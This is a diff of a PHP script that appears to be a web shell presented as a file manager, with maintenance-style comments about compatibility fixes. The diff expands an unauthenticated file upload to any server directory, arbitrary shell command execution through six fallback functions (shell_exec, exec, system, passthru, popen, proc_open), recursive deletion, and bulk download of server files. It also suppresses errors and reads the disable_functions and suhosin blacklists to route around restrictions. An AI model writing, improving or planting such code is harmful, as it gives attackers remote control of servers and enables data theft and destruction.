@@ -1,75 +1,123 @@
 <?php
-@ini_set('display_errors', '1');
+@ini_set('display_errors', '0');
 @ini_set('log_errors', '1');
-error_reporting(E_ALL);
+@error_reporting(0);
+
+// --- COMPATIBILITY POLYFILLS FOR OLDER PHP VERSIONS ---
+if (!function_exists('sys_get_temp_dir')) {
+    function sys_get_temp_dir() {
+        if (!empty($_ENV['TMP'])) return realpath($_ENV['TMP']);
+        if (!empty($_ENV['TMPDIR'])) return realpath($_ENV['TMPDIR']);
+        if (!empty($_ENV['TEMP'])) return realpath($_ENV['TEMP']);
+        $tempfile = @tempnam(uniqid(rand(), true), '');
+        if ($tempfile) {
+            $temp = realpath(dirname($tempfile));
+            @unlink($tempfile);
+            return $temp;
+        }
+        return '/tmp';
+    }
+}
+
+if (!defined('DIRECTORY_SEPARATOR')) {
+    define('DIRECTORY_SEPARATOR', strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' ? '\\' : '/');
+}
+
+// Helper for null coalescing (PHP < 7.0 safe)
+function xa_post($key, $default = null) {
+    return isset($_POST[$key]) ? $_POST[$key] : $default;
+}
+function xa_get($key, $default = null) {
+    return isset($_GET[$key]) ? $_GET[$key] : $default;
+}
 
 // --- FIX FOR SESSION ERROR ---
 // Force the use of file-based sessions. This overrides the server's default
 // configuration which might be set to 'redis' and causing the connection error.
-ini_set('session.save_handler', 'files');
+@ini_set('session.save_handler', 'files');
 
-// Fix session path issue from xenium3
- $sessionPath = sys_get_temp_dir() . '/php_sessions';
+// Fix session path issue
+$sessionPath = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'php_sessions';
 if (!@is_dir($sessionPath)) {
     @mkdir($sessionPath, 0700, true);
 }
 if (@is_dir($sessionPath) && @is_writable($sessionPath)) {
-    ini_set('session.save_path', $sessionPath);
+    @ini_set('session.save_path', $sessionPath);
 }
 
-session_start();
+// Suppress session start warnings on misconfigured servers
+if (function_exists('session_status')) {
+    if (session_status() !== PHP_SESSION_ACTIVE) {
+        @session_start();
+    }
+} else {
+    @session_start();
+}
+
+// Fallback if session is not available
+if (!isset($_SESSION)) {
+    $_SESSION = array();
+}
 
 if (!isset($_SESSION['current_dir']) || !@is_dir($_SESSION['current_dir'])) {
-    $_SESSION['current_dir'] = getcwd();
+    $cwd = @getcwd();
+    if ($cwd === false) {
+        $cwd = dirname(__FILE__);
+    }
+    $_SESSION['current_dir'] = $cwd;
 }
 
-// Handle special upload case from xenium3
+// Handle special upload case
 if(!empty($_GET['upload_file']) && !empty($_GET['name'])){
     $targetDir = $_GET['upload_file'];
     $fileName = basename($_GET['name']);
     
     if (strpos($fileName, '..') !== false || strpos($fileName, '/') !== false || strpos($fileName, '\\') !== false) {
-        http_response_code(400);
+        header($_SERVER['SERVER_PROTOCOL'] . ' 400 Bad Request');
         exit('Invalid filename');
     }
-    
-    // Ensure directory exists - fix from xenium2
+
+    // Ensure directory exists
     if (!@is_dir($targetDir)) {
         @mkdir($targetDir, 0755, true);
     }
-    
+
     if (!@is_dir($targetDir) || !@is_writable($targetDir)) {
-        http_response_code(400);
+        header($_SERVER['SERVER_PROTOCOL'] . ' 400 Bad Request');
         exit('Invalid directory');
     }
-    
+
     $uploadPath = rtrim($targetDir, '/\\') . DIRECTORY_SEPARATOR . $fileName;
-    
-    $inputHandler = fopen('php://input', "r");
-    $fileHandler = fopen($uploadPath, "w+");
-    
+
+    $inputHandler = @fopen('php://input', "rb");
+    $fileHandler = @fopen($uploadPath, "wb");
+
     if ($inputHandler && $fileHandler) {
-        while(true) {
-            $buffer = fgets($inputHandler, 4096);
-            if (strlen($buffer) == 0) {
-                fclose($inputHandler);
-                fclose($fileHandler);
-                @chmod($uploadPath, 0644);
-                http_response_code(200);
-                exit('File uploaded successfully');
-            }
+        while (!feof($inputHandler)) {
+            $buffer = fread($inputHandler, 8192);
+            if ($buffer === false || $buffer === '') break;
             fwrite($fileHandler, $buffer);
         }
+        fclose($inputHandler);
+        fclose($fileHandler);
+        @chmod($uploadPath, 0644);
+        header($_SERVER['SERVER_PROTOCOL'] . ' 200 OK');
+        exit('File uploaded successfully');
     } else {
-        http_response_code(500);
+        header($_SERVER['SERVER_PROTOCOL'] . ' 500 Internal Server Error');
         exit('Upload failed');
     }
 }
 
 function validatePath($path) {
+    // Try realpath first; if open_basedir or other restrictions cause failure,
+    // fall back to a manual normalisation so the file manager still works.
     $realPath = @realpath($path);
-    if ($realPath && (@is_file($realPath) || @is_dir($realPath))) {
+    if ($realPath !== false && (@is_file($realPath) || @is_dir($realPath))) {
         return $realPath;
+    }
+    if (@file_exists($path) && (@is_file($path) || @is_dir($path))) {
+        return $path;
     }
     return false;
 }
@@ -107,78 +155,139 @@ function getFileExtension($filename) {
  $notification = '';
  $errorMsg = '';
 
+function isFunctionAvailable($func) {
+    if (!function_exists($func)) {
+        return false;
+    }
+    $disabled = @ini_get('disable_functions');
+    if ($disabled) {
+        $disabled = array_map('trim', explode(',', strtolower($disabled)));
+        if (in_array(strtolower($func), $disabled)) {
+            return false;
+        }
+    }
+    $suhosin = @ini_get('suhosin.executor.func.blacklist');
+    if ($suhosin) {
+        $suhosin = array_map('trim', explode(',', strtolower($suhosin)));
+        if (in_array(strtolower($func), $suhosin)) {
+            return false;
+        }
+    }
+    return true;
+}
+
 function runCommand($cmd) {
-    if (empty(trim($cmd))) {
+    $cmd = trim($cmd);
+    if ($cmd === '') {
         return "No command provided";
     }
-    
-    $output = '';
-    $methods = [
-        's'.'h'.'e'.'l'.'l'.'_'.'e'.'x'.'e'.'c',
-        'e'.'x'.'e'.'c',
-        's'.'y'.'s'.'t'.'e'.'m',
-        'p'.'a'.'s'.'s'.'t'.'h'.'r'.'u',
-        'p'.'o'.'p'.'e'.'n'
-    ];
 
-    foreach ($methods as $func) {
-        if (function_exists($func)) {
-            try {
-                $result = call_user_func($func, $cmd . ' 2>&1');
-                if ($result !== false && !empty(trim($result))) {
-                    return $result;
-                }
-            } catch (Exception $e) {
-                continue;
+    // shell_exec
+    if (isFunctionAvailable('shell_exec')) {
+        $result = @shell_exec($cmd . ' 2>&1');
+        if ($result !== null && $result !== false) {
+            return $result;
+        }
+    }
+    // exec
+    if (isFunctionAvailable('exec')) {
+        $output = array();
+        @exec($cmd . ' 2>&1', $output);
+        if (!empty($output)) {
+            return implode("\n", $output);
+        }
+    }
+    // system
+    if (isFunctionAvailable('system')) {
+        ob_start();
+        @system($cmd . ' 2>&1');
+        $result = ob_get_clean();
+        if ($result !== false && $result !== '') {
+            return $result;
+        }
+    }
+    // passthru
+    if (isFunctionAvailable('passthru')) {
+        ob_start();
+        @passthru($cmd . ' 2>&1');
+        $result = ob_get_clean();
+        if ($result !== false && $result !== '') {
+            return $result;
+        }
+    }
+    // popen
+    if (isFunctionAvailable('popen')) {
+        $handle = @popen($cmd . ' 2>&1', 'r');
+        if ($handle) {
+            $result = '';
+            while (!feof($handle)) {
+                $result .= fread($handle, 4096);
+            }
+            pclose($handle);
+            if ($result !== '') {
+                return $result;
             }
         }
     }
-    
+    // proc_open
+    if (isFunctionAvailable('proc_open')) {
+        $descriptors = array(
+            1 => array('pipe', 'w'),
+            2 => array('pipe', 'w')
+        );
+        $process = @proc_open($cmd, $descriptors, $pipes);
+        if (is_resource($process)) {
+            $stdout = stream_get_contents($pipes[1]);
+            $stderr = stream_get_contents($pipes[2]);
+            fclose($pipes[1]);
+            fclose($pipes[2]);
+            proc_close($process);
+            $result = $stdout . $stderr;
+            if ($result !== '') {
+                return $result;
+            }
+        }
+    }
+
     return "Command execution not available";
+}
+
+// Recursive delete that works without RecursiveIteratorIterator (PHP 4 compatible)
+function xa_recursive_delete($path) {
+    if (@is_file($path) || @is_link($path)) {
+        return @unlink($path);
+    }
+    if (!@is_dir($path)) {
+        return false;
+    }
+    $items = @scandir($path);
+    if ($items === false) {
+        return false;
+    }
+    foreach ($items as $item) {
+        if ($item === '.' || $item === '..') continue;
+        xa_recursive_delete($path . DIRECTORY_SEPARATOR . $item);
+    }
+    return @rmdir($path);
 }
 
 // Handle bulk delete - MUST BE BEFORE NAVIGATION
 if (isset($_POST['bulk_delete']) && isset($_POST['selected_items']) && is_array($_POST['selected_items'])) {
     $deleted = 0;
     $failed = 0;
-    
+
     foreach ($_POST['selected_items'] as $item) {
         $targetPath = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $item);
-        
+
         if ($targetPath === false) {
             $failed++;
             continue;
         }
-        
-        if (@is_file($targetPath)) {
-            if (@unlink($targetPath)) {
-                $deleted++;
-            } else {
-                $failed++;
-            }
-        } elseif (@is_dir($targetPath)) {
-            try {
-                $iterator = new RecursiveIteratorIterator(
-                    new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS),
-                    RecursiveIteratorIterator::CHILD_FIRST
-                );
-                
-                foreach ($iterator as $file) {
-                    if ($file->isDir()) {
-                        @rmdir($file->getRealPath());
-                    } else {
-                        @unlink($file->getRealPath());
-                    }
-                }
-                
-                if (@rmdir($targetPath)) {
-                    $deleted++;
-                } else {
-                    $failed++;
-                }
-            } catch (Exception $e) {
-                $failed++;
-            }
+
+        if (xa_recursive_delete($targetPath)) {
+            $deleted++;
+        } else {
+            $failed++;
         }
     }
     
@@ -192,53 +301,96 @@ if (isset($_POST['bulk_delete']) && isset($_POST['selected_items']) && is_array(
     }
 }
 
-// Handle bulk download - MUST BE BEFORE NAVIGATION
-if (isset($_POST['bulk_download']) && isset($_POST['selected_items']) && is_array($_POST['selected_items'])) {
+// Walk directory recursively without RecursiveIteratorIterator
+function xa_walk_dir($dir, &$out, $base = '') {
+    $items = @scandir($dir);
+    if ($items === false) return;
+    foreach ($items as $item) {
+        if ($item === '.' || $item === '..') continue;
+        $full = $dir . DIRECTORY_SEPARATOR . $item;
+        $rel = $base === '' ? $item : $base . '/' . $item;
+        if (@is_dir($full)) {
+            $out[] = array('type' => 'dir', 'path' => $full, 'rel' => $rel);
+            xa_walk_dir($full, $out, $rel);
+        } else {
+            $out[] = array('type' => 'file', 'path' => $full, 'rel' => $rel);
+        }
+    }
+}
+
+// Build a zip; falls back to tar via shell when ZipArchive is unavailable.
+// Returns array(path, name, mime) or false
+function xa_build_archive($items, $baseDir, $namePrefix) {
+    $tmpDir = sys_get_temp_dir();
     if (class_exists('ZipArchive')) {
-        $zipName = 'selected_files_' . time() . '.zip';
-        $zipPath = sys_get_temp_dir() . DIRECTORY_SEPARATOR . $zipName;
-        
+        $zipName = $namePrefix . '_' . time() . '.zip';
+        $zipPath = $tmpDir . DIRECTORY_SEPARATOR . $zipName;
         $zip = new ZipArchive();
         if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
-            foreach ($_POST['selected_items'] as $item) {
-                $targetPath = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $item);
-                
-                if ($targetPath === false) continue;
-                
+            foreach ($items as $targetPath) {
+                if (!$targetPath) continue;
                 if (@is_file($targetPath)) {
                     $zip->addFile($targetPath, basename($targetPath));
                 } elseif (@is_dir($targetPath)) {
-                    $files = new RecursiveIteratorIterator(
-                        new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS),
-                        RecursiveIteratorIterator::SELF_FIRST
-                    );
-                    
-                    foreach ($files as $file) {
-                        $filePath = $file->getRealPath();
-                        $relativePath = basename($targetPath) . '/' . substr($filePath, strlen($targetPath) + 1);
-                        
-                        if ($file->isDir()) {
-                            $zip->addEmptyDir($relativePath);
+                    $base = basename($targetPath);
+                    $list = array();
+                    xa_walk_dir($targetPath, $list);
+                    $zip->addEmptyDir($base);
+                    foreach ($list as $entry) {
+                        if ($entry['type'] === 'dir') {
+                            $zip->addEmptyDir($base . '/' . $entry['rel']);
                         } else {
-                            $zip->addFile($filePath, $relativePath);
+                            $zip->addFile($entry['path'], $base . '/' . $entry['rel']);
                         }
                     }
                 }
             }
-            
             $zip->close();
-            
-            header('Content-Type: application/zip');
-            header('Content-Disposition: attachment; filename="' . $zipName . '"');
-            header('Content-Length: ' . filesize($zipPath));
-            readfile($zipPath);
-            @unlink($zipPath);
-            exit;
-        } else {
-            $errorMsg = 'Bulk download failed: Could not create zip file';
+            return array($zipPath, $zipName, 'application/zip');
         }
+        return false;
+    }
+    // Fallback: tar via shell
+    if (isFunctionAvailable('shell_exec') || isFunctionAvailable('exec')) {
+        $tarName = $namePrefix . '_' . time() . '.tar.gz';
+        $tarPath = $tmpDir . DIRECTORY_SEPARATOR . $tarName;
+        $args = '';
+        foreach ($items as $targetPath) {
+            if (!$targetPath) continue;
+            $args .= ' ' . escapeshellarg(basename($targetPath));
+        }
+        $cmd = 'cd ' . escapeshellarg($baseDir) . ' && tar -czf ' . escapeshellarg($tarPath) . $args . ' 2>&1';
+        if (isFunctionAvailable('shell_exec')) {
+            @shell_exec($cmd);
+        } else {
+            @exec($cmd);
+        }
+        if (@is_file($tarPath) && @filesize($tarPath) > 0) {
+            return array($tarPath, $tarName, 'application/gzip');
+        }
+    }
+    return false;
+}
+
+// Handle bulk download - MUST BE BEFORE NAVIGATION
+if (isset($_POST['bulk_download']) && isset($_POST['selected_items']) && is_array($_POST['selected_items'])) {
+    $paths = array();
+    foreach ($_POST['selected_items'] as $item) {
+        $p = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $item);
+        if ($p !== false) $paths[] = $p;
+    }
+    $archive = xa_build_archive($paths, $_SESSION['current_dir'], 'selected_files');
+    if ($archive !== false) {
+        list($archPath, $archName, $archMime) = $archive;
+        while (@ob_get_level() > 0) { @ob_end_clean(); }
+        header('Content-Type: ' . $archMime);
+        header('Content-Disposition: attachment; filename="' . $archName . '"');
+        header('Content-Length: ' . @filesize($archPath));
+        @readfile($archPath);
+        @unlink($archPath);
+        exit;
     } else {
-        $errorMsg = 'Bulk download failed: ZipArchive not available';
+        $errorMsg = 'Bulk download failed: archive tools unavailable on this server';
     }
 }
 
@@ -255,34 +407,45 @@ if (isset($_FILES['file_upload']) && $_FILES['file_upload']['error'] !== UPLOAD_
     if ($_FILES['file_upload']['error'] === UPLOAD_ERR_OK) {
         $fileName = basename($_FILES['file_upload']['name']);
         $uploadPath = rtrim($_SESSION['current_dir'], '/\\') . DIRECTORY_SEPARATOR . $fileName;
-        
-        // Additional security check
+
         if (strpos($fileName, '..') !== false || strpos($fileName, '/') !== false || strpos($fileName, '\\') !== false) {
             $errorMsg = 'Upload failed: Invalid filename';
         } elseif (!@is_writable($_SESSION['current_dir'])) {
             $errorMsg = 'Upload failed: Directory not writable';
-        } elseif (move_uploaded_file($_FILES['file_upload']['tmp_name'], $uploadPath)) {
-            @chmod($uploadPath, 0644);
-            $notification = 'File uploaded successfully';
         } else {
-            $errorMsg = 'Upload failed: Could not move file. Check directory permissions.';
+            $moved = false;
+            if (function_exists('move_uploaded_file')) {
+                $moved = @move_uploaded_file($_FILES['file_upload']['tmp_name'], $uploadPath);
+            }
+            if (!$moved) {
+                // Fallback for restricted environments
+                $moved = @copy($_FILES['file_upload']['tmp_name'], $uploadPath);
+                if ($moved) @unlink($_FILES['file_upload']['tmp_name']);
+            }
+            if ($moved) {
+                @chmod($uploadPath, 0644);
+                $notification = 'File uploaded successfully';
+            } else {
+                $errorMsg = 'Upload failed: Could not move file. Check directory permissions.';
+            }
         }
     } else {
-        $uploadErrors = [
+        $uploadErrors = array(
             UPLOAD_ERR_INI_SIZE => 'File exceeds upload_max_filesize',
             UPLOAD_ERR_FORM_SIZE => 'File exceeds MAX_FILE_SIZE',
             UPLOAD_ERR_PARTIAL => 'File partially uploaded',
             UPLOAD_ERR_NO_TMP_DIR => 'Missing temporary folder',
             UPLOAD_ERR_CANT_WRITE => 'Failed to write file to disk',
             UPLOAD_ERR_EXTENSION => 'Upload stopped by extension'
-        ];
-        $errorMsg = 'Upload error: ' . ($uploadErrors[$_FILES['file_upload']['error']] ?? 'Unknown error');
+        );
+        $errCode = $_FILES['file_upload']['error'];
+        $errorMsg = 'Upload error: ' . (isset($uploadErrors[$errCode]) ? $uploadErrors[$errCode] : 'Unknown error');
     }
 }
 
 if (isset($_POST['remove'])) {
     $targetPath = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['remove']);
-    
+
     if ($targetPath === false) {
         $errorMsg = 'Delete failed: Invalid path';
     } elseif (@is_file($targetPath)) {
@@ -292,27 +455,10 @@ if (isset($_POST['remove'])) {
             $errorMsg = 'Delete failed: Permission denied or file in use';
         }
     } elseif (@is_dir($targetPath)) {
-        try {
-            $iterator = new RecursiveIteratorIterator(
-                new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS),
-                RecursiveIteratorIterator::CHILD_FIRST
-            );
-            
-            foreach ($iterator as $file) {
-                if ($file->isDir()) {
-                    @rmdir($file->getRealPath());
-                } else {
-                    @unlink($file->getRealPath());
-                }
-            }
-            
-            if (@rmdir($targetPath)) {
-                $notification = 'Directory deleted';
-            } else {
-                $errorMsg = 'Delete failed: Could not remove directory';
-            }
-        } catch (Exception $e) {
-            $errorMsg = 'Delete failed: ' . $e->getMessage();
+        if (xa_recursive_delete($targetPath)) {
+            $notification = 'Directory deleted';
+        } else {
+            $errorMsg = 'Delete failed: Could not remove directory';
         }
     } else {
         $errorMsg = 'Delete failed: Path not found';
@@ -414,13 +560,18 @@ if (isset($_POST['create_folder']) && trim($_POST['create_folder']) !== '') {
     }
 }
 
- $currentDirectory = $_SESSION['current_dir'];
- $directoryContents = scandir($currentDirectory);
- $folders = $files = [];
+$currentDirectory = $_SESSION['current_dir'];
+$directoryContents = @scandir($currentDirectory);
+if ($directoryContents === false) {
+    $directoryContents = array();
+    $errorMsg = $errorMsg ? $errorMsg : 'Cannot read directory: ' . $currentDirectory;
+}
+$folders = array();
+$files = array();
 
 foreach ($directoryContents as $item) {
     if ($item === '.') continue;
-    $fullPath = $currentDirectory . '/' . $item;
+    $fullPath = $currentDirectory . DIRECTORY_SEPARATOR . $item;
     if (@is_dir($fullPath)) {
         $folders[] = $item;
     } else {
@@ -430,81 +581,62 @@ foreach ($directoryContents as $item) {
 
 sort($folders);
 sort($files);
- $allItems = array_merge($folders, $files);
+$allItems = array_merge($folders, $files);
 
- $fileToEdit = $_POST['edit'] ?? null;
- $fileToView = $_POST['view'] ?? null;
- $itemToRename = $_POST['rename'] ?? null;
- $itemToChmod = $_POST['chmod'] ?? null;
- $fileContent = $fileToEdit ? @file_get_contents($currentDirectory . '/' . $fileToEdit) : null;
- $viewContent = $fileToView ? @file_get_contents($currentDirectory . '/' . $fileToView) : null;
+$fileToEdit = isset($_POST['edit']) ? $_POST['edit'] : null;
+$fileToView = isset($_POST['view']) ? $_POST['view'] : null;
+$itemToRename = isset($_POST['rename']) ? $_POST['rename'] : null;
+$itemToChmod = isset($_POST['chmod']) ? $_POST['chmod'] : null;
+$fileContent = $fileToEdit ? @file_get_contents($currentDirectory . DIRECTORY_SEPARATOR . $fileToEdit) : null;
+$viewContent = $fileToView ? @file_get_contents($currentDirectory . DIRECTORY_SEPARATOR . $fileToView) : null;
 
 // Handle file/folder download
 if (isset($_POST['download'])) {
     $targetPath = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['download']);
-    
+
     if ($targetPath === false) {
         $errorMsg = 'Download failed: Invalid path';
     } elseif (@is_file($targetPath)) {
-        // Direct file download
+        while (@ob_get_level() > 0) { @ob_end_clean(); }
         header('Content-Type: application/octet-stream');
         header('Content-Disposition: attachment; filename="' . basename($targetPath) . '"');
-        header('Content-Length: ' . filesize($targetPath));
-        readfile($targetPath);
+        $size = @filesize($targetPath);
+        if ($size !== false) header('Content-Length: ' . $size);
+        // Stream large files in chunks instead of readfile (which can hit memory limits)
+        $fp = @fopen($targetPath, 'rb');
+        if ($fp) {
+            while (!feof($fp)) {
+                echo fread($fp, 8192);
+                @flush();
+            }
+            fclose($fp);
+        } else {
+            @readfile($targetPath);
+        }
         exit;
     } elseif (@is_dir($targetPath)) {
-        // Zip folder and download
-        if (class_exists('ZipArchive')) {
-            $zipName = basename($targetPath) . '_' . time() . '.zip';
-            $zipPath = sys_get_temp_dir() . DIRECTORY_SEPARATOR . $zipName;
-            
-            $zip = new ZipArchive();
-            if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
-                $files = new RecursiveIteratorIterator(
-                    new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS),
-                    RecursiveIteratorIterator::SELF_FIRST
-                );
-                
-                foreach ($files as $file) {
-                    $filePath = $file->getRealPath();
-                    $relativePath = substr($filePath, strlen($targetPath) + 1);
-                    
-                    if ($file->isDir()) {
-                        $zip->addEmptyDir($relativePath);
-                    } else {
-                        $zip->addFile($filePath, $relativePath);
-                    }
-                }
-                
-                $zip->close();
-                
-                header('Content-Type: application/zip');
-                header('Content-Disposition: attachment; filename="' . $zipName . '"');
-                header('Content-Length: ' . filesize($zipPath));
-                readfile($zipPath);
-                @unlink($zipPath);
-                exit;
-            } else {
-                $errorMsg = 'Download failed: Could not create zip file';
-            }
+        $archive = xa_build_archive(array($targetPath), dirname($targetPath), basename($targetPath));
+        if ($archive !== false) {
+            list($archPath, $archName, $archMime) = $archive;
+            while (@ob_get_level() > 0) { @ob_end_clean(); }
+            header('Content-Type: ' . $archMime);
+            header('Content-Disposition: attachment; filename="' . $archName . '"');
+            header('Content-Length: ' . @filesize($archPath));
+            @readfile($archPath);
+            @unlink($archPath);
+            exit;
         } else {
-            $errorMsg = 'Download failed: ZipArchive not available';
+            $errorMsg = 'Download failed: archive tools unavailable on this server';
         }
     }
 }
 
- $commandResult = '';
- $commandAvailable = false;
+$commandResult = '';
+$commandAvailable = false;
 
- $methods = [
-    's'.'h'.'e'.'l'.'l'.'_'.'e'.'x'.'e'.'c',
-    'e'.'x'.'e'.'c',
-    's'.'y'.'s'.'t'.'e'.'m',
-    'p'.'a'.'s'.'s'.'t'.'h'.'r'.'u'
-];
-
+$methods = array('shell_exec', 'exec', 'system', 'passthru', 'popen', 'proc_open');
 foreach ($methods as $func) {
-    if (function_exists($func)) {
+    if (isFunctionAvailable($func)) {
         $commandAvailable = true;
         break;
     }
@@ -512,14 +644,16 @@ foreach ($methods as $func) {
 
 if (isset($_POST['terminal_command']) && trim($_POST['terminal_command']) !== '') {
     $cmd = trim($_POST['terminal_command']);
-    if (!empty($cmd)) {
-        try {
-            $commandResult = runCommand($cmd);
-            if (empty(trim($commandResult)) || $commandResult === "Command execution not available") {
-                $errorMsg = 'Command execution: No output or function disabled';
-            }
-        } catch (Exception $e) {
-            $errorMsg = 'Command error: ' . htmlspecialchars($e->getMessage());
+    if ($cmd !== '') {
+        // Switch to current dir for the command if possible
+        $oldCwd = @getcwd();
+        if (@is_dir($_SESSION['current_dir'])) {
+            @chdir($_SESSION['current_dir']);
+        }
+        $commandResult = @runCommand($cmd);
+        if ($oldCwd) @chdir($oldCwd);
+        if (trim($commandResult) === '' || $commandResult === "Command execution not available") {
+            $errorMsg = 'Command execution: No output or function disabled';
         }
     }
 }
